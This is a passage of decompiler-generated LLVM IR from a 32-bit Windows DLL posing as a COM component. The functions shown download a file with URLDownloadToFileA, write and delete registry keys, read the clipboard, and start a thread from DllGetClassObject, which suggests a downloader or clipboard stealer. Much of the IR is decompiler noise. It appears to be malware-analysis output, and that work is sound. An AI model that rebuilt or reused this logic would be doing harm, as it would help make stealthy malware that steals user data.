  ret i32 %0, !insn.addr !514
}

define i32 @function_404c6f() local_unnamed_addr {
dec_label_pc_404c6f:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !515
  %2 = inttoptr i32 %0 to i32*, !insn.addr !515
  store i32 %1, i32* %2, align 4, !insn.addr !515
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !516
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !516
  %7 = add i8 %4, %6, !insn.addr !516
  %8 = inttoptr i32 %5 to i8*, !insn.addr !516
  store i8 %7, i8* %8, align 1, !insn.addr !516
  %9 = load i8, i8* inttoptr (i32 1426063360 to i8*), align 16777216, !insn.addr !517
  %10 = load i32, i32* %eax, align 4, !insn.addr !517
  %11 = udiv i32 %10, 256, !insn.addr !517
  %12 = trunc i32 %11 to i8, !insn.addr !517
  %13 = add i8 %9, %12, !insn.addr !517
  store i8 %13, i8* inttoptr (i32 1426063360 to i8*), align 16777216, !insn.addr !517
  %14 = call i32 @function_4036b8(), !insn.addr !518
  %15 = call i32 @__readfsdword(i32 0), !insn.addr !519
  store i32 %15, i32* %stack_var_-24, align 4, !insn.addr !519
  %16 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !519
  call void @__writefsdword(i32 0, i32 %16), !insn.addr !520
  %17 = call i32 @"@LStrCatN"(), !insn.addr !521
  %18 = call i32 @function_4036c8(), !insn.addr !522
  %19 = inttoptr i32 %18 to i32*, !insn.addr !523
  %20 = call i32 @URLDownloadToFileA(i32* %19, i8* null, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !523
  call void @__writefsdword(i32 0, i32 0), !insn.addr !524
  %21 = call i32 @"@LStrArrayClr"(), !insn.addr !525
  ret i32 %21, !insn.addr !526
}

define i32 @function_404c78() local_unnamed_addr {
dec_label_pc_404c78:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0
}

define i32 @function_404ce6() local_unnamed_addr {
dec_label_pc_404ce6:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !527
  ret i32 %0, !insn.addr !527
}

define i32 @function_404ceb() local_unnamed_addr {
dec_label_pc_404ceb:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !528
}

define i32 @function_404ced(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_404ced:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !529
}

define i32 @function_404cf7() local_unnamed_addr {
dec_label_pc_404cf7:
  %edi = alloca i32, align 4
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %4 = add i32 %3, 1, !insn.addr !530
  %5 = inttoptr i32 %3 to i32*, !insn.addr !530
  store i32 %4, i32* %5, align 4, !insn.addr !530
  %6 = bitcast i32* %eax to i8*
  %7 = load i8, i8* %6, align 4, !insn.addr !531
  %8 = load i32, i32* %eax, align 4
  %9 = trunc i32 %8 to i8, !insn.addr !531
  %10 = add i8 %7, %9, !insn.addr !531
  %11 = inttoptr i32 %8 to i8*, !insn.addr !531
  store i8 %10, i8* %11, align 1, !insn.addr !531
  %12 = bitcast i32* %edi to i8*
  %13 = load i8, i8* %12, align 4, !insn.addr !532
  %14 = udiv i32 %1, 256, !insn.addr !532
  %15 = trunc i32 %14 to i8, !insn.addr !532
  %16 = add i8 %13, %15, !insn.addr !532
  %17 = load i32, i32* %edi, align 4, !insn.addr !532
  %18 = inttoptr i32 %17 to i8*, !insn.addr !532
  store i8 %16, i8* %18, align 1, !insn.addr !532
  %19 = load i8, i8* %6, align 4, !insn.addr !533
  %20 = load i32, i32* %eax, align 4
  %21 = trunc i32 %20 to i8, !insn.addr !533
  %22 = add i8 %19, %21, !insn.addr !533
  %23 = inttoptr i32 %20 to i8*, !insn.addr !533
  store i8 %22, i8* %23, align 1, !insn.addr !533
  %24 = add i32 %0, -117, !insn.addr !534
  %25 = inttoptr i32 %24 to i8*, !insn.addr !534
  %26 = load i8, i8* %25, align 1, !insn.addr !534
  %27 = trunc i32 %2 to i8, !insn.addr !534
  %28 = add i8 %26, %27, !insn.addr !534
  store i8 %28, i8* %25, align 1, !insn.addr !534
  %29 = trunc i32 %2 to i16, !insn.addr !535
  %30 = call i8 @__asm_in(i16 %29), !insn.addr !535
  %31 = call i32 @__readfsdword(i32 0), !insn.addr !536
  store i32 %31, i32* %stack_var_-12, align 4, !insn.addr !536
  %32 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !536
  call void @__writefsdword(i32 0, i32 %32), !insn.addr !537
  %33 = load i32, i32* @global_var_4096a0, align 4, !insn.addr !538
  %34 = add i32 %33, 1, !insn.addr !538
  store i32 %34, i32* @global_var_4096a0, align 4, !insn.addr !538
  %35 = load i32, i32* %stack_var_-12, align 4, !insn.addr !539
  call void @__writefsdword(i32 0, i32 %35), !insn.addr !540
  ret i32 0, !insn.addr !541
}

define i32 @function_404d25() local_unnamed_addr {
dec_label_pc_404d25:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !542
  ret i32 %0, !insn.addr !542
}

define i32 @function_404d2a() local_unnamed_addr {
dec_label_pc_404d2a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !543
}

define i32 @function_404d2c(i32 %arg1) local_unnamed_addr {
dec_label_pc_404d2c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !544
}

define i32 @function_404d30() local_unnamed_addr {
dec_label_pc_404d30:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a0, align 4, !insn.addr !545
  %2 = add i32 %1, -1, !insn.addr !545
  store i32 %2, i32* @global_var_4096a0, align 4, !insn.addr !545
  ret i32 %0, !insn.addr !546
}

define i32 @function_404d38() local_unnamed_addr {
dec_label_pc_404d38:
  %eax.0.reg2mem = alloca i32, !insn.addr !547
  %stack_var_-132 = alloca i8*, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %0 = call i32 @"@LStrAsg"(), !insn.addr !548
  store i32 0, i32* %stack_var_-116, align 4, !insn.addr !549
  store i32 0, i32* %stack_var_-128, align 4, !insn.addr !550
  store i8* getelementptr inbounds ([27 x i8], [27 x i8]* @global_var_404dc4, i32 0, i32 0), i8** %stack_var_-132, align 4, !insn.addr !551
  %1 = call i32 @function_40438c(i32 0, i32* nonnull %stack_var_-116, i32 1, i32 0, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @global_var_404dc4, i32 0, i32 0), i32 -2147483647), !insn.addr !552
  %2 = icmp eq i32 %1, 0, !insn.addr !553
  %3 = icmp eq i1 %2, false, !insn.addr !554
  store i32 %1, i32* %eax.0.reg2mem, !insn.addr !554
  br i1 %3, label %dec_label_pc_404db2, label %dec_label_pc_404d6d, !insn.addr !554

dec_label_pc_404d6d:                              ; preds = %dec_label_pc_404d38
  store i8* inttoptr (i32 101 to i8*), i8** %stack_var_-132, align 4, !insn.addr !555
  %4 = bitcast i8** %stack_var_-132 to i32*, !insn.addr !556
  %5 = call i32 @function_404394(i32 101, i32* nonnull %4, i32* nonnull %stack_var_-128, i32* nonnull @global_var_4080f8, i32 0, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_404de0, i32 0, i32 0), i32 -2147483647), !insn.addr !556
  %6 = icmp eq i32 %5, 0, !insn.addr !557
  %7 = icmp eq i1 %6, false, !insn.addr !558
  br i1 %7, label %dec_label_pc_404da9, label %dec_label_pc_404d99, !insn.addr !558

dec_label_pc_404d99:                              ; preds = %dec_label_pc_404d6d
  %8 = call i32 @"@LStrFromArray"(), !insn.addr !559
  br label %dec_label_pc_404da9, !insn.addr !559

dec_label_pc_404da9:                              ; preds = %dec_label_pc_404d99, %dec_label_pc_404d6d
  %9 = call i32 @function_404374(), !insn.addr !560
  store i32 %9, i32* %eax.0.reg2mem, !insn.addr !560
  br label %dec_label_pc_404db2, !insn.addr !560

dec_label_pc_404db2:                              ; preds = %dec_label_pc_404da9, %dec_label_pc_404d38
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !561
}

define i32 @function_404dbb(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_404dbb:
  %esp.1.reg2mem = alloca i32, !insn.addr !562
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !562
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_28 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_28, align 4
  %stack_var_24 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_24, align 4
  %5 = add i32 %3, 1, !insn.addr !562
  %6 = inttoptr i32 %3 to i32*, !insn.addr !562
  store i32 %5, i32* %6, align 4, !insn.addr !562
  %7 = bitcast i32* %eax to i8*
  %8 = load i8, i8* %7, align 4, !insn.addr !563
  %9 = load i32, i32* %eax, align 4
  %10 = trunc i32 %9 to i8, !insn.addr !563
  %11 = add i8 %8, %10, !insn.addr !563
  %12 = inttoptr i32 %9 to i8*, !insn.addr !563
  store i8 %11, i8* %12, align 1, !insn.addr !563
  %13 = add i32 %1, 122, !insn.addr !564
  %14 = inttoptr i32 %13 to i8*, !insn.addr !564
  %15 = load i8, i8* %14, align 1, !insn.addr !564
  %16 = udiv i32 %4, 256, !insn.addr !564
  %17 = trunc i32 %16 to i8, !insn.addr !564
  %18 = add i8 %15, %17, !insn.addr !564
  store i8 %18, i8* %14, align 1, !insn.addr !564
  %19 = load i8, i8* %7, align 4, !insn.addr !565
  %20 = load i32, i32* %eax, align 4, !insn.addr !565
  %21 = trunc i32 %20 to i8, !insn.addr !565
  %22 = add i8 %19, %21, !insn.addr !565
  %23 = icmp eq i8 %22, 0, !insn.addr !565
  %24 = inttoptr i32 %20 to i8*, !insn.addr !565
  store i8 %22, i8* %24, align 1, !insn.addr !565
  %25 = trunc i32 %3 to i16, !insn.addr !566
  call void @__asm_outsd(i16 %25, i32 %0), !insn.addr !566
  br i1 %23, label %26, label %dec_label_pc_404dc9, !insn.addr !567

; <label>:26:                                     ; preds = %dec_label_pc_404dbb
  %27 = call i32 @unknown_4e40(), !insn.addr !567
  br label %dec_label_pc_404dc9, !insn.addr !567

dec_label_pc_404dc9:                              ; preds = %26, %dec_label_pc_404dbb
  %28 = icmp ult i8 %22, %19, !insn.addr !565
  %29 = load i32, i32* %stack_var_24, align 4, !insn.addr !568
  store i32 %29, i32* %eax, align 4, !insn.addr !568
  br i1 %28, label %dec_label_pc_404e31, label %dec_label_pc_404dcc, !insn.addr !569

dec_label_pc_404dcc:                              ; preds = %dec_label_pc_404dc9
  %30 = call i8 @llvm.ctpop.i8(i8 %22), !range !570, !insn.addr !565
  %31 = and i8 %30, 1, !insn.addr !565
  %32 = icmp eq i8 %31, 0, !insn.addr !565
  %33 = trunc i32 %arg4 to i16, !insn.addr !571
  %34 = call i32 @__asm_insd(i16 %33), !insn.addr !571
  %35 = inttoptr i32 %2 to i32*, !insn.addr !571
  store i32 %34, i32* %35, align 4, !insn.addr !571
  br i1 %32, label %dec_label_pc_404e2c, label %dec_label_pc_404dd0, !insn.addr !572

dec_label_pc_404dd0:                              ; preds = %dec_label_pc_404dcc
  store i32 %arg3, i32* %stack_var_28, align 4, !insn.addr !573
  store i32 %arg3, i32* %stack_var_24, align 4, !insn.addr !574
  %36 = add i32 %arg4, 1, !insn.addr !575
  %37 = icmp eq i32 %36, 0, !insn.addr !575
  store i32* %stack_var_24, i32** %esp.0.in.reg2mem, !insn.addr !576
  br i1 %37, label %dec_label_pc_404e37, label %dec_label_pc_404dd6, !insn.addr !576

dec_label_pc_404dd6:                              ; preds = %dec_label_pc_404dd0
  %38 = load i32, i32* %eax, align 4, !insn.addr !577
  %39 = add i32 %38, -1, !insn.addr !577
  store i32 %39, i32* %eax, align 4, !insn.addr !577
  %40 = trunc i32 %36 to i16, !insn.addr !578
  %41 = inttoptr i32 %arg7 to i32*, !insn.addr !578
  %42 = load i32, i32* %41, align 4, !insn.addr !578
  call void @__asm_outsd(i16 %40, i32 %42), !insn.addr !578
  %43 = load i32, i32* %41, align 4, !insn.addr !579
  call void @__asm_outsd(i16 %40, i32 %43), !insn.addr !579
  %44 = add i32 %arg7, 105, !insn.addr !580
  %45 = inttoptr i32 %44 to i8*, !insn.addr !580
  %46 = load i8, i8* %45, align 1, !insn.addr !580
  %47 = trunc i32 %39 to i8, !insn.addr !580
  %48 = add i8 %46, %47, !insn.addr !580
  %49 = icmp ult i8 %48, %46, !insn.addr !580
  store i8 %48, i8* %45, align 1, !insn.addr !580
  store i32 0, i32* %esp.1.reg2mem, !insn.addr !581
  br i1 %49, label %dec_label_pc_404e57, label %dec_label_pc_404de4, !insn.addr !581

dec_label_pc_404de4:                              ; preds = %dec_label_pc_404dd6
  %50 = icmp eq i8 %48, 0, !insn.addr !580
  br i1 %50, label %dec_label_pc_404e06, label %dec_label_pc_404de6, !insn.addr !582

dec_label_pc_404de6:                              ; preds = %dec_label_pc_404de4
  store i32 %36, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !583
  store i32 -4, i32* %esp.1.reg2mem
  br label %dec_label_pc_404e57

dec_label_pc_404e06:                              ; preds = %dec_label_pc_404de4
  %51 = load i32, i32* %eax, align 4
  %52 = inttoptr i32 %51 to i32*, !insn.addr !584
  %53 = load i32, i32* %52, align 4, !insn.addr !584
  store i32 %53, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !584
  call void @__writefsdword(i32 %51, i32 -4), !insn.addr !585
  store i32 ptrtoint ([27 x i8]* @global_var_404e9c to i32), i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !586
  store i32 -2147483647, i32* inttoptr (i32 -12 to i32*), align 4, !insn.addr !587
  %54 = call i32 @RegDeleteKeyA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !588
  %55 = add i32 %arg6, -8, !insn.addr !589
  %56 = inttoptr i32 %55 to i32*, !insn.addr !589
  store i32 0, i32* %56, align 4, !insn.addr !589
  %57 = add i32 %arg6, -12, !insn.addr !590
  %58 = inttoptr i32 %57 to i32*, !insn.addr !590
  store i32 1, i32* %58, align 4, !insn.addr !590
  store i32 %57, i32* inttoptr (i32 -16 to i32*), align 16, !insn.addr !591
  ret i32 %57, !insn.addr !591

dec_label_pc_404e2c:                              ; preds = %dec_label_pc_404dcc
  %59 = load i32, i32* %eax, align 4
  ret i32 %59, !insn.addr !592

dec_label_pc_404e31:                              ; preds = %dec_label_pc_404dc9
  %60 = trunc i32 %2 to i8
  %61 = trunc i32 %arg3 to i8, !insn.addr !593
  %62 = add i8 %60, %61, !insn.addr !593
  %63 = inttoptr i32 %2 to i8*, !insn.addr !593
  store i8 %62, i8* %63, align 1, !insn.addr !593
  %64 = inttoptr i32 %arg4 to i8*, !insn.addr !594
  %65 = load i8, i8* %64, align 1, !insn.addr !594
  %66 = udiv i32 %arg3, 256, !insn.addr !594
  %67 = trunc i32 %66 to i8, !insn.addr !594
  %68 = add i8 %65, %67, !insn.addr !594
  store i8 %68, i8* %64, align 1, !insn.addr !594
  store i32* %stack_var_28, i32** %esp.0.in.reg2mem, !insn.addr !594
  br label %dec_label_pc_404e37, !insn.addr !594

dec_label_pc_404e37:                              ; preds = %dec_label_pc_404e31, %dec_label_pc_404dd0
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %69 = add i32 %esp.0, -4, !insn.addr !595
  %70 = inttoptr i32 %69 to i32*, !insn.addr !595
  store i32 0, i32* %70, align 4, !insn.addr !595
  %71 = add i32 %esp.0, -8, !insn.addr !596
  %72 = inttoptr i32 %71 to i32*, !insn.addr !596
  store i32 0, i32* %72, align 4, !insn.addr !596
  %73 = add i32 %esp.0, -12, !insn.addr !597
  %74 = inttoptr i32 %73 to i32*, !insn.addr !597
  store i32 ptrtoint ([27 x i8]* @global_var_404e9c to i32), i32* %74, align 4, !insn.addr !597
  %75 = add i32 %esp.0, -16, !insn.addr !598
  %76 = inttoptr i32 %75 to i32*, !insn.addr !598
  store i32 -2147483647, i32* %76, align 4, !insn.addr !598
  %77 = call i32 @RegCreateKeyExA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32** bitcast (i32* @0 to i32**), i32* nonnull @0), !insn.addr !599
  %78 = call i32 @function_4034c8(), !insn.addr !600
  %79 = add i32 %78, 1, !insn.addr !601
  %80 = add i32 %esp.0, -20, !insn.addr !602
  %81 = inttoptr i32 %80 to i32*, !insn.addr !602
  store i32 %79, i32* %81, align 4, !insn.addr !602
  store i32 %80, i32* %esp.1.reg2mem, !insn.addr !603
  br label %dec_label_pc_404e57, !insn.addr !603

dec_label_pc_404e57:                              ; preds = %dec_label_pc_404de6, %dec_label_pc_404e37, %dec_label_pc_404dd6
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %82 = call i32 @function_4036c8(), !insn.addr !604
  %83 = add i32 %esp.1.reload, -4, !insn.addr !605
  %84 = inttoptr i32 %83 to i32*, !insn.addr !605
  store i32 %82, i32* %84, align 4, !insn.addr !605
  %85 = add i32 %esp.1.reload, -8, !insn.addr !606
  %86 = inttoptr i32 %85 to i32*, !insn.addr !606
  store i32 1, i32* %86, align 4, !insn.addr !606
  %87 = add i32 %esp.1.reload, -12, !insn.addr !607
  %88 = inttoptr i32 %87 to i32*, !insn.addr !607
  store i32 0, i32* %88, align 4, !insn.addr !607
  %89 = add i32 %esp.1.reload, -16, !insn.addr !608
  %90 = inttoptr i32 %89 to i32*, !insn.addr !608
  store i32 ptrtoint ([10 x i8]* @global_var_404eb8 to i32), i32* %90, align 4, !insn.addr !608
  %91 = add i32 %arg6, -8, !insn.addr !609
  %92 = inttoptr i32 %91 to i32*, !insn.addr !609
  %93 = load i32, i32* %92, align 4, !insn.addr !609
  %94 = add i32 %esp.1.reload, -20, !insn.addr !610
  %95 = inttoptr i32 %94 to i32*, !insn.addr !610
  store i32 %93, i32* %95, align 4, !insn.addr !610
  %96 = call i32 @RegSetValueExA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !611
  %97 = load i32, i32* %92, align 4, !insn.addr !612
  %98 = add i32 %esp.1.reload, -24, !insn.addr !613
  %99 = inttoptr i32 %98 to i32*, !insn.addr !613
  store i32 %97, i32* %99, align 4, !insn.addr !613
  %100 = call i32 @function_404374(), !insn.addr !614
  %101 = load i32, i32* %99, align 4, !insn.addr !615
  call void @__writefsdword(i32 0, i32 %101), !insn.addr !616
  store i32 4214421, i32* %90, align 4, !insn.addr !617
  %102 = call i32 @"@LStrClr"(), !insn.addr !618
  ret i32 %102, !insn.addr !619
}

define i32 @function_404e8e() local_unnamed_addr {
dec_label_pc_404e8e:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !620
  ret i32 %0, !insn.addr !620
}

define i32 @function_404e93() local_unnamed_addr {
dec_label_pc_404e93:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !621
}

define i32 @function_404e95() local_unnamed_addr {
dec_label_pc_404e95:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !622
}

define i32 @function_404e99(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_404e99:
  %.reg2mem = alloca i32, !insn.addr !623
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = trunc i32 %2 to i8
  %4 = mul i8 %3, 2, !insn.addr !623
  %5 = inttoptr i32 %2 to i8*, !insn.addr !623
  store i8 %4, i8* %5, align 1, !insn.addr !623
  %6 = add i32 %0, 111, !insn.addr !624
  %7 = inttoptr i32 %6 to i8*, !insn.addr !624
  %8 = load i8, i8* %7, align 1, !insn.addr !624
  %9 = trunc i32 %1 to i8, !insn.addr !624
  %10 = add i8 %8, %9, !insn.addr !624
  %11 = icmp eq i8 %10, 0, !insn.addr !624
  store i8 %10, i8* %7, align 1, !insn.addr !624
  br i1 %11, label %12, label %dec_label_pc_404ea1, !insn.addr !625

; <label>:12:                                     ; preds = %dec_label_pc_404e99
  %13 = call i32 @unknown_4f18(), !insn.addr !625
  br label %dec_label_pc_404ea1, !insn.addr !625

dec_label_pc_404ea1:                              ; preds = %12, %dec_label_pc_404e99
  %14 = icmp ult i8 %10, %8, !insn.addr !624
  br i1 %14, label %dec_label_pc_404f09, label %dec_label_pc_404ea4, !insn.addr !626

dec_label_pc_404ea4:                              ; preds = %dec_label_pc_404ea1
  %15 = call i8 @llvm.ctpop.i8(i8 %10), !range !570, !insn.addr !624
  %16 = and i8 %15, 1, !insn.addr !624
  %17 = icmp eq i8 %16, 0, !insn.addr !624
  %18 = trunc i32 %arg4 to i16, !insn.addr !627
  %19 = call i32 @__asm_insd(i16 %18), !insn.addr !627
  %20 = inttoptr i32 %arg8 to i32*, !insn.addr !627
  store i32 %19, i32* %20, align 4, !insn.addr !627
  br i1 %17, label %dec_label_pc_404f04, label %dec_label_pc_404ea8, !insn.addr !628

dec_label_pc_404ea8:                              ; preds = %dec_label_pc_404ea4
  %21 = add i32 %arg4, 1, !insn.addr !629
  %22 = icmp eq i32 %21, 0, !insn.addr !629
  store i32 %arg2, i32* %.reg2mem, !insn.addr !630
  br i1 %22, label %dec_label_pc_404f0f, label %dec_label_pc_404eae, !insn.addr !630

dec_label_pc_404eae:                              ; preds = %dec_label_pc_404ea8
  %23 = add i32 %arg2, -1, !insn.addr !631
  %24 = trunc i32 %21 to i16, !insn.addr !632
  %25 = inttoptr i32 %arg7 to i32*, !insn.addr !632
  %26 = load i32, i32* %25, align 4, !insn.addr !632
  call void @__asm_outsd(i16 %24, i32 %26), !insn.addr !632
  %27 = load i32, i32* %25, align 4, !insn.addr !633
  call void @__asm_outsd(i16 %24, i32 %27), !insn.addr !633
  %28 = add i32 %arg7, 105, !insn.addr !634
  %29 = inttoptr i32 %28 to i8*, !insn.addr !634
  %30 = load i8, i8* %29, align 1, !insn.addr !634
  %31 = trunc i32 %23 to i8, !insn.addr !634
  %32 = add i8 %30, %31, !insn.addr !634
  %33 = icmp eq i8 %32, 0, !insn.addr !634
  store i8 %32, i8* %29, align 1, !insn.addr !634
  br i1 %33, label %dec_label_pc_404ede, label %dec_label_pc_404ebe, !insn.addr !635

dec_label_pc_404ebe:                              ; preds = %dec_label_pc_404eae
  store i32 %21, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !636
  %34 = inttoptr i32 %23 to i8*, !insn.addr !637
  %35 = load i8, i8* %34, align 1, !insn.addr !637
  %36 = add i8 %35, %31, !insn.addr !637
  store i8 %36, i8* %34, align 1, !insn.addr !637
  %37 = add i32 %arg5, 86, !insn.addr !638
  %38 = inttoptr i32 %37 to i8*, !insn.addr !638
  %39 = load i8, i8* %38, align 1, !insn.addr !638
  %40 = trunc i32 %21 to i8, !insn.addr !638
  %41 = add i8 %39, %40, !insn.addr !638
  store i8 %41, i8* %38, align 1, !insn.addr !638
  store i32 %arg8, i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !639
  %42 = call i32 @"@LStrClr"(), !insn.addr !640
  store i32 0, i32* inttoptr (i32 -12 to i32*), align 4, !insn.addr !641
  %43 = call i1 @OpenClipboard(i32* nonnull @0), !insn.addr !642
  %44 = zext i1 %43 to i32, !insn.addr !643
  ret i32 %44, !insn.addr !643

dec_label_pc_404ede:                              ; preds = %dec_label_pc_404eae
  %factor = mul i32 %arg6, 2
  %45 = add i32 %factor, 106, !insn.addr !644
  %46 = inttoptr i32 %45 to i8*, !insn.addr !644
  %47 = load i8, i8* %46, align 2, !insn.addr !644
  %48 = mul i8 %47, 2, !insn.addr !644
  store i8 %48, i8* %46, align 2, !insn.addr !644
  %49 = call i32* @GetClipboardData(i32 ptrtoint (i32* @0 to i32)), !insn.addr !645
  %50 = icmp eq i32* %49, null, !insn.addr !646
  br i1 %50, label %dec_label_pc_404f09, label %dec_label_pc_404eee, !insn.addr !647

dec_label_pc_404eee:                              ; preds = %dec_label_pc_404ede
  %51 = ptrtoint i32* %49 to i32, !insn.addr !645
  store i32 %51, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !648
  %52 = call i32* @GlobalLock(i32* nonnull @0), !insn.addr !649
  %53 = icmp eq i32* %52, null, !insn.addr !650
  br i1 %53, label %dec_label_pc_404f09, label %dec_label_pc_404efa, !insn.addr !651

dec_label_pc_404efa:                              ; preds = %dec_label_pc_404eee
  %54 = call i32 @"@LStrFromPChar"(), !insn.addr !652
  store i32 %51, i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !653
  br label %dec_label_pc_404f04, !insn.addr !653

dec_label_pc_404f04:                              ; preds = %dec_label_pc_404efa, %dec_label_pc_404ea4
  %55 = call i1 @GlobalUnlock(i32* nonnull @0), !insn.addr !654
  br label %dec_label_pc_404f09, !insn.addr !654

dec_label_pc_404f09:                              ; preds = %dec_label_pc_404f04, %dec_label_pc_404eee, %dec_label_pc_404ede, %dec_label_pc_404ea1
  %56 = call i1 @CloseClipboard(), !insn.addr !655
  %57 = sext i1 %56 to i32, !insn.addr !655
  store i32 %57, i32* %.reg2mem, !insn.addr !656
  br label %dec_label_pc_404f0f, !insn.addr !656

dec_label_pc_404f0f:                              ; preds = %dec_label_pc_404ea8, %dec_label_pc_404f09
  %.reload = load i32, i32* %.reg2mem, !insn.addr !657
  ret i32 %.reload, !insn.addr !657
}

define i32 @DllGetClassObject(i32 %arg1) local_unnamed_addr {
dec_label_pc_404f14:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i8*, align 4
  %2 = inttoptr i32 %1 to i8*, !insn.addr !658
  store i8* %2, i8** %stack_var_-8, align 4, !insn.addr !658
  %3 = load i32, i32* inttoptr (i32 4227384 to i32*), align 8, !insn.addr !659
  %4 = inttoptr i32 %3 to i32*, !insn.addr !660
  %5 = load i32, i32* %4, align 4, !insn.addr !660
  %6 = icmp eq i32 %5, 0, !insn.addr !660
  %7 = icmp eq i1 %6, false, !insn.addr !661
  %8 = icmp eq i1 %7, false, !insn.addr !662
  br i1 %8, label %dec_label_pc_404f50, label %dec_label_pc_404f27, !insn.addr !662

dec_label_pc_404f27:                              ; preds = %dec_label_pc_404f14
  %9 = inttoptr i32 %0 to i8*, !insn.addr !663
  %10 = call i32* @FindWindowA(i8* %9, i8* %2), !insn.addr !664
  %11 = icmp eq i32* %10, null, !insn.addr !665
  %12 = icmp eq i1 %11, false, !insn.addr !666
  br i1 %12, label %dec_label_pc_404f50, label %dec_label_pc_404f3a, !insn.addr !666

dec_label_pc_404f3a:                              ; preds = %dec_label_pc_404f27
  %13 = bitcast i8** %stack_var_-8 to %_SECURITY_ATTRIBUTES*
  %14 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %13, i32 0, i32 (i32*)* inttoptr (i32 66 to i32 (i32*)*), i32* inttoptr (i32 4220780 to i32*), i32 0, i32* null), !insn.addr !667
  br label %dec_label_pc_404f50, !insn.addr !667

dec_label_pc_404f50:                              ; preds = %dec_label_pc_404f3a, %dec_label_pc_404f27, %dec_label_pc_404f14
  %15 = inttoptr i32 %arg1 to i32*, !insn.addr !668
  store i32 0, i32* %15, align 4, !insn.addr !668
  ret i32 -2147221231, !insn.addr !669
}

define i32 @DllCanUnloadNow() local_unnamed_addr {
dec_label_pc_404f7c:
  ret i32 0, !insn.addr !670
}

define i32 @DllRegisterServer() local_unnamed_addr {
dec_label_pc_404f80:
  ret i32 0, !insn.addr !671
}

define i32 @DllUnregisterServer() local_unnamed_addr {
dec_label_pc_404f84:
  ret i32 0, !insn.addr !672
}

define i32 @function_404f88() local_unnamed_addr {
dec_label_pc_404f88:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !673
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !673
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !673
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !674
  %2 = load i32, i32* @global_var_4096a4, align 4, !insn.addr !675
  %3 = add i32 %2, 1, !insn.addr !675
  store i32 %3, i32* @global_var_4096a4, align 4, !insn.addr !675
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !676
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !677
  ret i32 0, !insn.addr !678
}

define i32 @function_404fad() local_unnamed_addr {
dec_label_pc_404fad:
